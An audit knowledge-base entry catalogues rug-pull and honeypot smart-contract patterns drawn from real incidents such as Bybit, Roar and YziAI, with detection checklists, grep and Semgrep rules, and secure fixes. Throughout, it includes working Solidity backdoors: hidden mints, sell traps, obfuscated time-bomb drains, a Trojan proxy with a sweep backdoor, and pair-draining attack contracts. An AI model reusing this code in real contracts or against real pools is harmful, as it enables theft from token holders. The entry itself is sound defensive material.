---
# Core Classification (Required)
protocol: generic
chain: everychain
category: malicious_code
vulnerability_type: rug_pull_detection

# Attack Vector Details (Required)
attack_type: intentional_malicious_code
affected_component: token_contract

# Technical Primitives (Required)
primitives:
  - hidden_mint_function
  - transfer_restriction
  - honeypot_mechanism
  - hidden_fee_extraction
  - selfdestruct_capability
  - malicious_proxy_upgrade
  - owner_controlled_trading
  - backdoor_function
  - magic_number_trigger
  - time_locked_malicious_upgrade
  - unverified_external_contract

# Impact Classification (Required)
severity: critical
impact: total_fund_loss
exploitability: 1.0
financial_impact: critical

# Context Tags
tags:
  - defi
  - token
  - scam
  - honeypot
  - rug_pull
  - malicious_contract
  - audit_detection
  - real_exploit

source: DeFiHackLabs
---

## Rug Pull & Malicious Contract Detection Patterns

### Overview

Rug pulls and malicious contracts are intentionally designed to steal user funds through hidden backdoors, transfer restrictions, or privileged functions. This database entry catalogs detection patterns derived from real-world exploits to aid auditors in identifying malicious code during security reviews. Unlike typical vulnerabilities (unintentional bugs), these patterns represent deliberate malicious design.

### Vulnerability Description

#### Root Cause

Malicious contracts contain intentionally hidden functionality that allows the contract deployer (or privileged addresses) to:
- Drain liquidity from trading pairs
- Prevent users from selling tokens (honeypots)
- Mint unlimited tokens to dilute value
- Extract hidden fees or redirect funds
- Upgrade to malicious implementations
- Self-destruct and steal remaining funds

These patterns exploit user trust and the complexity of smart contract code to hide malicious logic.

#### Attack Scenario

**General Rug Pull Flow:**
1. Deployer creates token with hidden malicious functionality
2. Liquidity is added to DEX (Uniswap, PancakeSwap)
3. Marketing drives users to buy the token
4. Users cannot sell (honeypot) OR deployer drains liquidity
5. Deployer extracts all value, leaving users with worthless tokens

---

## Category 1: Hidden Mint/Burn Functions

### Pattern 1.1: Magic Number Triggered Mint (YziAI Pattern) [CRITICAL]

**Real-World Example: YziAI Token - March 2025 - ~376 BNB (~$126K)**
- PoC: `DeFiHackLabs/src/test/2025-03/YziAIToken_exp.sol`
- Analysis: https://x.com/TenArmorAlert/status/1905528525785805027

```solidity
// ❌ MALICIOUS: Hidden mint triggered by magic number in transferFrom
function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) {
    // @audit Magic number 1199002345 triggers hidden mint and drain
    if(msg.sender == manager && amount == 1199002345) {
        _mint(address(this), supply * 10000);  // Mint massive supply
        _approve(address(this), router, supply * 100000);
        
        path.push(address(this));
        path.push(IUniswapV2Router02(router).WETH());
        
        // @audit Drain liquidity pool to manager
        IUniswapV2Router02(router).swapExactTokensForETH(
            balanceOf(to) * 1000,
            1,
            path,
            manager,  // Funds go to manager
            block.timestamp + 1e10
        );
        return true;
    }
    // Normal transfer logic follows...
}
```

**Detection Checklist:**
- [ ] Check for magic numbers in transfer/transferFrom conditions
- [ ] Look for conditional minting based on amount values
- [ ] Verify no hidden paths that bypass normal transfer logic
- [ ] Check for manager/owner-only branches in transfer functions

### Pattern 1.2: Privileged Mint Without Event Emission [HIGH]

```solidity
// ❌ MALICIOUS: Hidden mint function without proper events or visibility
function _secretMint(address to, uint256 amount) internal {
    // @audit No event emission, easily hidden
    _balances[to] += amount;
    _totalSupply += amount;
}

// Called through innocuous-looking function
function updateRewards() external onlyOwner {
    _secretMint(owner(), totalSupply() * 100);  // 100x supply mint
}
```

### Pattern 1.3: Burn from Any Address [HIGH]

```solidity
// ❌ MALICIOUS: Owner can burn anyone's tokens
function burnFrom(address account, uint256 amount) external onlyOwner {
    // @audit No approval check - owner can burn any user's tokens
    _burn(account, amount);
}
```

---

## Category 2: Transfer Restrictions (Honeypots)

### Pattern 2.1: TaxWallet-Based Pair Drain (IRYSAI Pattern) [CRITICAL]

**Real-World Example: IRYSAI - May 2025 - ~$69K**
- PoC: `DeFiHackLabs/src/test/2025-05/IRYSAI_exp.sol`
- Analysis: https://x.com/TenArmorAlert/status/1925012844052975776

```solidity
// ❌ MALICIOUS: setTaxWallet allows draining liquidity pair
interface IIRYSAI {
    function setTaxWallet(address) external;  // @audit Who can call this?
    function transferFrom(address, address, uint256) external returns (bool);
}

// Attack contract can be set as tax wallet, gaining transferFrom privileges
contract AttackContract {
    function burn() public {
        // @audit Direct transfer from pair without approval
        IIRYSAI(token).transferFrom(pair, address(this), pairBalance - dust);
        IPair(pair).sync();  // Update reserves to reflect theft
        
        // Swap stolen tokens for ETH
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(...);
    }
}
```

**Detection Checklist:**
- [ ] Verify setTaxWallet/setFeeWallet has proper access control
- [ ] Check if tax wallet can call transferFrom without approval
- [ ] Look for special privileges granted to configurable addresses

### Pattern 2.2: Cumulative Transfer Limit (Honeypot) [CRITICAL]

**Real-World Example: GoPlus Honeypot Analysis**
- Contract: 0x8f96e9348898b498a2b4677f4c8abdad64e4349f (BSC)

```solidity
// ❌ MALICIOUS: Cumulative sell limit that traps users
mapping(address => uint256) private _accSeAmount;      // Accumulated sell amount
mapping(address => uint256) private _accSeMaxAmount;   // Max allowed to sell

function _transfer(address from, address to, uint256 amount) internal {
    // @audit Selling to DEX pair triggers limit check
    if (to == uniswapV2Pair) {
        if (_accSeMaxAmount[from] > 0) {
            _accSeAmount[from] += amount;
            // @audit Once cumulative exceeds max, user is trapped
            require(_accSeAmount[from] <= _accSeMaxAmount[from], "Limit");
        }
    }
    // Normal transfer...
}

// @audit Hidden function controlled by contractSender1 (not owner)
function setAccSeMaxAmount(address account, uint256 amount) external {
    require(msg.sender == contractSender1);  // Not the owner!
    _accSeMaxAmount[account] = amount;
}
```

**Detection Checklist:**
- [ ] Search for cumulative/accumulated amount tracking
- [ ] Check for separate privileged addresses (not just owner)
- [ ] Look for different limits applied to buys vs sells
- [ ] Verify ownership isn't transferred to dead address while backdoor remains

### Pattern 2.3: Blacklist/Whitelist Manipulation [HIGH]

```solidity
// ❌ MALICIOUS: Off-chain event monitoring sets blacklist
mapping(address => bool) private _blacklisted;

function _transfer(address from, address to, uint256 amount) internal {
    require(!_blacklisted[from], "Blacklisted");  // @audit Can't sell if blacklisted
    // ...
}

// @audit Deployer monitors Transfer events and blacklists new holders
function setBlacklist(address account, bool status) external onlyOwner {
    _blacklisted[account] = status;
}
```

### Pattern 2.4: Time-Based Transfer Lock [HIGH]

```solidity
// ❌ MALICIOUS: Hidden time lock on sells
mapping(address => uint256) private _lastBuyTime;

function _transfer(address from, address to, uint256 amount) internal {
    if (to == pair) {  // Selling
        // @audit 999 years lock - effectively permanent
        require(block.timestamp >= _lastBuyTime[from] + 999 * 365 days, "Locked");
    }
    if (from == pair) {  // Buying
        _lastBuyTime[to] = block.timestamp;
    }
    // ...
}
```

### Pattern 2.5: Hidden Fee That Blocks Sells [HIGH]

```solidity
// ❌ MALICIOUS: 100% fee on sells
function _transfer(address from, address to, uint256 amount) internal {
    uint256 fee = 0;
    if (to == pair && from != owner()) {
        fee = amount * sellFee / 100;  // @audit sellFee can be set to 100
    }
    require(amount > fee, "Amount too small");
    // ...
}

function setSellFee(uint256 _fee) external onlyOwner {
    sellFee = _fee;  // @audit No upper bound - can set to 100%
}
```

---

## Category 3: Hidden Fee Mechanisms

### Pattern 3.1: Unverified External Contract Fee Logic (CirculateBUSD Pattern) [CRITICAL]

**Real-World Example: CirculateBUSD - January 2023 - $2.27M**
- Analysis: DeFiHackLabs Academy Rugpull Analysis

```solidity
// ❌ MALICIOUS: Unverified external contract controls fund flow
address public swapHelper;  // @audit NOT VERIFIED - source hidden

function startTrading() external onlyOwner {
    // @audit TradingInfo from unverified contract determines behavior
    (bool shouldSwap, uint256 amount) = ISwapHelper(swapHelper).TradingInfo();
    
    if (shouldSwap) {
        // @audit swaptoToken in unverified contract can drain funds
        ISwapHelper(swapHelper).swaptoToken(amount);
    }
}
```

**Detection Checklist:**
- [ ] Verify ALL external contract addresses are verified on-chain
- [ ] Check external calls in privileged functions
- [ ] Look for configurable external contract addresses
- [ ] Reverse engineer unverified contracts or flag as critical risk

### Pattern 3.2: Dynamic Fee Recipient [HIGH]

```solidity
// ❌ MALICIOUS: Fee recipient can be changed to drain contract
address public feeRecipient;

function _transfer(address from, address to, uint256 amount) internal {
    uint256 fee = amount * feePercent / 100;
    _balances[feeRecipient] += fee;  // @audit Fees go to configurable address
    // ...
}

// @audit Can redirect all fees to attacker
function setFeeRecipient(address _recipient) external onlyOwner {
    feeRecipient = _recipient;
}
```

---

## Category 4: Self-Destruct Capabilities

### Pattern 4.1: Hidden Selfdestruct [CRITICAL]

```solidity
// ❌ MALICIOUS: Self-destruct sends all ETH to owner
function emergencyWithdraw() external onlyOwner {
    selfdestruct(payable(owner()));  // @audit Destroys contract, steals ETH
}

// Or hidden in fallback
fallback() external payable {
    if (msg.sender == owner()) {
        selfdestruct(payable(owner()));
    }
}
```

**Note:** As of Solidity 0.8.18+, `selfdestruct` is deprecated but still functional on many chains.

### Pattern 4.2: Delegatecall to Selfdestruct [CRITICAL]

```solidity
// ❌ MALICIOUS: Delegatecall can execute selfdestruct from external contract
function upgrade(address newImplementation) external onlyOwner {
    // @audit newImplementation can contain selfdestruct
    (bool success,) = newImplementation.delegatecall(abi.encodeWithSignature("initialize()"));
    require(success);
}
```

---

## Category 5: Malicious Proxy Implementations

### Pattern 5.1: Trojan Proxy Upgrade (Bybit Pattern) [CRITICAL]

**Real-World Example: Bybit Cold Wallet Hack - February 2025 - $1.5B**
- PoC: `DeFiHackLabs/src/test/2025-02/Bybit_exp.sol`
- Analysis: https://x.com/zachxbt/status/1893211577836302365

```solidity
// ❌ MALICIOUS: Trojan contract disguises masterCopy change as transfer
contract Trojan {
    address public masterCopy;  // @audit Slot 0 - same as Safe proxy
    
    // @audit Looks like ERC20 transfer but overwrites proxy implementation
    function transfer(address to, uint256 amount) public {
        masterCopy = to;  // Overwrites slot 0 - changes proxy implementation!
    }
}

contract Backdoor {
    // @audit Now all calls to proxy execute this code
    function sweepETH(address destination) public {
        (bool success,) = destination.call{value: address(this).balance}("");
        require(success);
    }
    
    function sweepERC20(address token, address destination) public {
        IERC20(token).transfer(destination, IERC20(token).balanceOf(address(this)));
    }
}

// Attack flow:
// 1. Social engineer signers to sign "transfer(backdoor, 0)" via delegatecall
// 2. Delegatecall executes Trojan.transfer which overwrites masterCopy (slot 0)
// 3. Proxy now points to Backdoor contract
// 4. Call sweepETH/sweepERC20 to drain all funds
```

**Detection Checklist:**
- [ ] Verify delegatecall targets cannot modify critical storage slots
- [ ] Check if function signatures match common functions (transfer, approve)
- [ ] Audit all contracts that can be delegatecalled
- [ ] Verify multisig transaction descriptions match actual calldata

### Pattern 5.2: Upgradeable Proxy with Hidden Admin [HIGH]

```solidity
// ❌ MALICIOUS: Admin stored in non-standard slot
contract MaliciousProxy {
    // @audit Admin in unusual slot to hide from casual inspection
    bytes32 private constant ADMIN_SLOT = keccak256("hidden.admin.slot.xyz");
    
    function _getAdmin() internal view returns (address admin) {
        bytes32 slot = ADMIN_SLOT;
        assembly { admin := sload(slot) }
    }
    
    // @audit Standard admin() returns dead address
    function admin() external view returns (address) {
        return address(0xdead);  // Appears renounced!
    }
    
    function upgradeTo(address newImpl) external {
        require(msg.sender == _getAdmin());  // Real admin check
        // ...
    }
}
```

---

## Category 6: Time-Locked Malicious Upgrades

### Pattern 6.1: Time-Based Backdoor Activation (Roar Pattern) [CRITICAL]

**Real-World Example: Roar - April 2025 - ~$789K**
- PoC: `DeFiHackLabs/src/test/2025-04/Roar_exp.sol`
- Analysis: https://x.com/CertiKAlert/status/1912430535999189042

```solidity
// ❌ MALICIOUS: Complex time-based formula hides backdoor activation
contract MaliciousToken {
    uint256 constant T0 = 0x67ff15af;  // @audit Hidden timestamp
    uint256 constant BIGC = 0x25aaa441b6cac9c2f49d8d012ccc517de4215e056b0f63883f8240c8e228fed1;
    uint256 constant DEN = 365000 * 24 * 3600;
    uint256 constant K = 35;
    uint256 constant OFF = 61066966765;

    function EmergencyWithdraw() public {
        // @audit Complex math obfuscates time-based condition
        if (block.timestamp >= T0) {
            uint256 rate = BIGC / DEN;
            if ((((block.timestamp * rate * K) - (OFF * rate)) / (rate * K)) == (block.timestamp - T0)) {
                // @audit Backdoor: drain tokens and LP
                uint256 bal1 = token.balanceOf(address(this));
                token.transfer(tx.origin, bal1);
                lpToken.transfer(tx.origin, lpBalance);
            }
        }
    }
}
```

**Detection Checklist:**
- [ ] Look for block.timestamp comparisons with hardcoded values
- [ ] Check for obfuscated constants that decode to timestamps
- [ ] Analyze complex math that could hide time conditions
- [ ] Flag functions with emergency/withdraw in name

### Pattern 6.2: Delayed Activation via Block Number [HIGH]

```solidity
// ❌ MALICIOUS: Backdoor activates after certain block
uint256 public activationBlock;

function initialize() external {
    activationBlock = block.number + 100000;  // ~2 weeks later
}

function emergencyDrain() external {
    // @audit Only works after activation block
    require(block.number >= activationBlock, "Not yet");
    payable(owner()).transfer(address(this).balance);
}
```

---

## Category 7: Owner-Controlled Swap Disabling

### Pattern 7.1: Trading Enable/Disable (BUBAI Pattern) [CRITICAL]

**Real-World Example: BUBAI - October 2024 - ~$131K**
- PoC: `DeFiHackLabs/src/test/2024-10/BUBAI_exp.sol`
- Analysis: https://x.com/TenArmorAlert/status/1851445795918118927

```solidity
// ❌ MALICIOUS: Token allows transfer from pair without approval
interface IORAAI {
    function transferFrom(address, address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
}

// Attack: 
// 1. Pair has approved attacker's contract (how?)
// 2. Attacker drains pair's tokens directly
// 3. Calls sync() to update reserves
// 4. Swaps stolen tokens for ETH

contract AttackContract {
    function attack() public {
        // @audit Direct transferFrom pair - shouldn't be possible normally
        token.transferFrom(pair, address(this), pairBalance - 100);
        IPair(pair).sync();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(...);
    }
}
```

### Pattern 7.2: Trading Pair Manipulation [HIGH]

```solidity
// ❌ MALICIOUS: Owner can change or disable trading pair
address public tradingPair;
bool public tradingEnabled;

function setTradingPair(address _pair) external onlyOwner {
    tradingPair = _pair;  // @audit Can set to address(0) to disable
}

function enableTrading(bool _enabled) external onlyOwner {
    tradingEnabled = _enabled;
}

function _transfer(address from, address to, uint256 amount) internal {
    if (to == tradingPair || from == tradingPair) {
        require(tradingEnabled, "Trading disabled");  // @audit Owner can disable
    }
    // ...
}
```

### Pattern 7.3: Anti-Bot That Blocks Everyone [HIGH]

```solidity
// ❌ MALICIOUS: Anti-bot can block all sells
mapping(address => bool) public isBot;

function _transfer(address from, address to, uint256 amount) internal {
    require(!isBot[from], "Bot");  // @audit Owner can mark anyone as bot
    // ...
}

// @audit No limit on who can be marked
function setBot(address account, bool status) external onlyOwner {
    isBot[account] = status;
}
```

---

## Category 8: VRug - Direct Pair Swap Manipulation [CRITICAL]

**Real-World Example: VRug - November 2024 - ~$8.4K**
- PoC: `DeFiHackLabs/src/test/2024-11/VRug_exp.sol`
- Analysis: https://x.com/TenArmorAlert/status/1854702463737380958

```solidity
// ❌ MALICIOUS: Direct swap from pair with manipulated reserves
// Attack: Attacker funds the pair directly, then calls swap to extract

vm.startPrank(attacker);
// @audit Deal tokens directly to pair (simulating reserve manipulation)
deal(weth, address(pair), manipulatedAmount);

// @audit Direct swap extracts value at manipulated rate
IUniswapV2Pair(pair).swap(amountOut, 0, mev, "");
```

**Detection Checklist:**
- [ ] Check if pair contract has unusual permissions
- [ ] Verify reserves cannot be directly manipulated
- [ ] Look for deals/mints that bypass normal trading flow

---

## Impact Analysis

### Technical Impact
- Complete loss of user funds (tokens become worthless or unsellable)
- Liquidity pool drainage
- Token supply manipulation causing hyperinflation
- Contract destruction with ETH theft
- Proxy hijacking enabling arbitrary code execution

### Business Impact
- Total financial loss for token holders
- Severe reputation damage to blockchain ecosystem
- Regulatory scrutiny on DeFi projects
- Loss of user trust in decentralized systems

### Affected Scenarios
- New token launches on DEXes
- Meme coin trading
- Projects with unverified/closed-source contracts
- Upgradeable proxy contracts
- Multisig wallets (social engineering component)

---

## Secure Implementation

**Fix 1: No Privileged Transfer Functions**
```solidity
// ✅ SECURE: Standard ERC20 without special cases
function transfer(address to, uint256 amount) public override returns (bool) {
    _transfer(msg.sender, to, amount);
    return true;
}

function transferFrom(address from, address to, uint256 amount) public override returns (bool) {
    _spendAllowance(from, msg.sender, amount);  // Always check allowance
    _transfer(from, to, amount);
    return true;
}
```

**Fix 2: Immutable Fee Parameters**
```solidity
// ✅ SECURE: Fees set at deployment, cannot be changed
uint256 public immutable buyFee;
uint256 public immutable sellFee;
uint256 public constant MAX_FEE = 5;  // 5% max

constructor(uint256 _buyFee, uint256 _sellFee) {
    require(_buyFee <= MAX_FEE && _sellFee <= MAX_FEE, "Fee too high");
    buyFee = _buyFee;
    sellFee = _sellFee;
}
```

**Fix 3: Renounced Ownership with No Backdoors**
```solidity
// ✅ SECURE: True renunciation - no hidden admin
contract SafeToken is ERC20, Ownable {
    // No additional privileged variables
    // No contractSender, manager, or hidden admin slots
    
    constructor() ERC20("Safe", "SAFE") {
        // Mint total supply at deployment
        _mint(msg.sender, TOTAL_SUPPLY);
        // Renounce immediately
        renounceOwnership();
    }
    
    // No owner-only functions that can affect transfers
}
```

**Fix 4: Transparent Proxy with Timelock**
```solidity
// ✅ SECURE: Upgrades require timelock and multiple signers
contract SafeUpgradeableProxy {
    uint256 public constant UPGRADE_DELAY = 7 days;
    
    struct PendingUpgrade {
        address implementation;
        uint256 activationTime;
    }
    
    PendingUpgrade public pendingUpgrade;
    
    function proposeUpgrade(address newImpl) external onlyMultisig {
        pendingUpgrade = PendingUpgrade({
            implementation: newImpl,
            activationTime: block.timestamp + UPGRADE_DELAY
        });
        emit UpgradeProposed(newImpl, pendingUpgrade.activationTime);
    }
    
    function executeUpgrade() external onlyMultisig {
        require(block.timestamp >= pendingUpgrade.activationTime, "Too early");
        _upgradeTo(pendingUpgrade.implementation);
    }
}
```

---

## Detection Patterns

### Code Patterns to Look For

```
- Magic numbers in transfer conditions (e.g., amount == 1199002345)
- Separate privileged address besides owner (contractSender, manager)
- Cumulative transfer tracking (_accSeAmount patterns)
- Configurable external contract addresses (swapHelper, router)
- delegatecall to user-supplied addresses
- slot 0 modification in non-proxy contexts
- block.timestamp comparisons with hardcoded values
- Complex math that could hide conditions
- Functions named emergency/withdraw/drain
- Transfer restrictions based on to/from == pair
- Unverified contract dependencies
```

### Audit Checklist

- [ ] **Ownership**: Is ownership truly renounced? Check for hidden admin slots
- [ ] **External Calls**: Are all external contract addresses verified?
- [ ] **Transfer Logic**: Any special cases in transfer/transferFrom?
- [ ] **Fee Mechanism**: Are fees bounded? Can recipient be changed?
- [ ] **Trading Control**: Can owner disable trading or modify pair?
- [ ] **Blacklist/Whitelist**: What are the restrictions? Who controls them?
- [ ] **Proxy Pattern**: Is implementation change timelocked?
- [ ] **Delegatecall**: What contracts can be delegatecalled?
- [ ] **Time Conditions**: Any block.timestamp or block.number checks?
- [ ] **Mint/Burn**: Who can mint/burn and under what conditions?
- [ ] **Selfdestruct**: Any selfdestruct in the contract or dependencies?

### Static Analysis Queries

**Semgrep Pattern for Magic Number Transfers:**
```yaml
rules:
  - id: magic-number-transfer
    pattern: |
      function transferFrom(...) {
        ...
        if (... && $AMOUNT == $MAGIC) {
          ...
        }
        ...
      }
    message: "Potential magic number trigger in transferFrom"
    severity: ERROR
```

**Grep Patterns:**
```bash
# Hidden admin patterns
rg "contractSender|hiddenAdmin|secretOwner" --type sol

# Cumulative tracking
rg "_accSeAmount|_accSeMaxAmount|cumulativeLimit" --type sol

# Selfdestruct
rg "selfdestruct|suicide" --type sol

# Magic timestamp constants
rg "0x67ff15af|1744830319" --type sol

# Emergency functions
rg "emergency|withdraw|drain|sweep" --type sol
```

---

## Real-World Examples

### Known Exploits

| Protocol | Date | Loss | Pattern | PoC |
|----------|------|------|---------|-----|
| **Bybit** | Feb 2025 | $1.5B | Trojan Proxy Upgrade | `DeFiHackLabs/src/test/2025-02/Bybit_exp.sol` |
| **Roar** | Apr 2025 | $789K | Time-Based Backdoor | `DeFiHackLabs/src/test/2025-04/Roar_exp.sol` |
| **YziAI** | Mar 2025 | $126K | Magic Number Mint | `DeFiHackLabs/src/test/2025-03/YziAIToken_exp.sol` |
| **IRYSAI** | May 2025 | $69K | TaxWallet Drain | `DeFiHackLabs/src/test/2025-05/IRYSAI_exp.sol` |
| **BUBAI/ORAAI** | Oct 2024 | $131K | Pair Transfer Exploit | `DeFiHackLabs/src/test/2024-10/BUBAI_exp.sol` |
| **VRug** | Nov 2024 | $8.4K | Pair Swap Manipulation | `DeFiHackLabs/src/test/2024-11/VRug_exp.sol` |
| **CirculateBUSD** | Jan 2023 | $2.27M | Unverified External Contract | DeFiHackLabs Academy Analysis |
| **RuggedArt** | Feb 2024 | ~$5 ETH | Staking Exploit | `DeFiHackLabs/src/test/2024-02/RuggedArt_exp.sol` |

### Related Post-Mortems
- Bybit: https://x.com/zachxbt/status/1893211577836302365
- Roar: https://x.com/CertiKAlert/status/1912430535999189042
- YziAI: https://x.com/TenArmorAlert/status/1905528525785805027
- IRYSAI: https://x.com/TenArmorAlert/status/1925012844052975776

---

## Prevention Guidelines

### Development Best Practices

1. **Verify all contracts**: Never interact with unverified contracts
2. **Use standard patterns**: OpenZeppelin ERC20 without modifications
3. **Immutable parameters**: Set fees and limits at deployment
4. **Timelock upgrades**: Require delay for any proxy upgrades
5. **Multi-sig for critical functions**: Don't rely on single owner
6. **No magic numbers**: All conditions should be transparent
7. **Event emission**: Emit events for all state changes
8. **Bounded parameters**: Max limits on fees, delays, etc.

### User Protection Guidelines

1. **Check verification status**: Only interact with verified contracts
2. **Review source code**: Look for owner privileges and special logic
3. **Check honeypot detectors**: GoPlus, TokenSniffer, RugDoc
4. **Verify liquidity lock**: Is LP locked and for how long?
5. **Check ownership**: Is it renounced? Are there hidden admins?
6. **Small test transactions**: Try selling before buying large amounts
7. **Check trading history**: Any blocked sells or failed transactions?

### Testing Requirements

- Unit tests for: All transfer paths, fee calculations, ownership functions
- Integration tests for: DEX interactions, pair creation, trading flows
- Fuzzing targets: Transfer amounts, addresses, timestamps
- Invariant tests: Total supply unchanged except explicit mint/burn

---

## References

### Technical Documentation
- [OpenZeppelin ERC20](https://docs.openzeppelin.com/contracts/4.x/erc20)
- [Gnosis Safe Documentation](https://docs.safe.global/)
- [Uniswap V2 Core](https://docs.uniswap.org/contracts/v2/overview)

### Security Research
- [DeFiHackLabs Repository](https://github.com/SunWeb3Sec/DeFiHackLabs)
- [GoPlus Security - Honeypot Analysis](https://gopluslabs.io/)
- [SlowMist - Bybit Analysis](https://x.com/SlowMist_Team/status/1892963250385592345)
- [Numen Cyber - CirculateBUSD Analysis](https://numencyber.com/)

### Detection Tools
- [GoPlus Token Security API](https://gopluslabs.io/)
- [TokenSniffer](https://tokensniffer.com/)
- [RugDoc](https://rugdoc.io/)
- [Honeypot.is](https://honeypot.is/)

---

## Keywords for Search

`rug pull`, `honeypot`, `malicious contract`, `backdoor`, `hidden mint`, `transfer restriction`, `sell block`, `magic number`, `trojan proxy`, `selfdestruct`, `drain liquidity`, `pair manipulation`, `fee extraction`, `owner privilege`, `cumulative limit`, `trading disabled`, `blacklist`, `unverified contract`, `time bomb`, `delayed activation`, `proxy hijack`, `masterCopy`, `delegatecall exploit`, `social engineering`, `multisig attack`, `tax wallet`, `emergency withdraw`, `sweep function`, `secret admin`

---

## Related Vulnerabilities

- [Access Control Vulnerabilities](../access-control/access-control-vulnerabilities.md)
- [Proxy Pattern Vulnerabilities](../proxy-vulnerabilities/PROXY_PATTERN_VULNERABILITIES.md)
- [Flash Loan Attack Patterns](../flash-loan/flash-loan-attack-patterns.md)
- [UUPS Proxy Vulnerabilities](../uups-proxy/UUPS_PROXY_VULNERABILITIES.md)
